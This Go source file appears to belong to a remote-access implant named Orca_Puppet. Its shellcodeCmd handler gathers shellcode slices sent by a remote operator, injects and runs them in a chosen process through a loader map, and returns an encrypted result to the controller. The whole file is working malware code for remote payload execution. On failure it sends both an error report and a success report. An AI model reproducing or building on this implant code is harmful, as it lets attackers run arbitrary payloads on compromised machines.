package controller

import (
	"Orca_Puppet/cli/cmdopt/shellcodeopt"
	"Orca_Puppet/cli/common"
	"Orca_Puppet/cli/common/setchannel"
	"Orca_Puppet/define/colorcode"
	"Orca_Puppet/define/config"
	"Orca_Puppet/define/debug"
	"Orca_Puppet/tools/crypto"
	"encoding/json"
	"time"
)

func shellcodeCmd(sendUserId, decData string) {
	shellcodeopt.InitLoaderMap()
	// 获取id对应的管道
	m, exist := setchannel.GetFileSliceDataChan(sendUserId)
	if !exist {
		m = make(chan interface{})
		setchannel.AddFileSliceDataChan(sendUserId, m)
	}
	defer setchannel.DeleteFileSliceDataChan(sendUserId)
	// 获取shellcode元信息
	var shellcodeMetaInfo shellcodeopt.ShellcodeMetaInfo
	err := json.Unmarshal([]byte(decData), &shellcodeMetaInfo)
	if err != nil {
		return
	}
	sliceNum := shellcodeMetaInfo.SliceNum
	loadFunc := shellcodeMetaInfo.LoadFunc
	pid := shellcodeMetaInfo.Pid
	// 循环从管道中获取shellcode元数据并写入
	var shellcode []byte
	for i := 0; i < sliceNum+1; i++ {
		select {
		case metaData := <-m:
			shellcode = append(shellcode, metaData.([]byte)...)
		case <-time.After(3 * time.Second):
			return
		}
	}
	stdErr := shellcodeopt.LoaderMap[loadFunc](shellcode, pid)
	if stdErr != "" {
		data := colorcode.OutputMessage(colorcode.SIGN_FAIL, stdErr)
		outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
		common.SendFailMsg(sendUserId, common.ClientId, "exec_ret", outputMsg, "")
	}

	data := colorcode.OutputMessage(colorcode.SIGN_SUCCESS, "the shellcode is loaded and executed successfully")
	outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
	common.SendSuccessMsg(sendUserId, common.ClientId, "exec_ret", outputMsg, "")
	debug.DebugPrint("the shellcode is loaded and executed successfully")
}
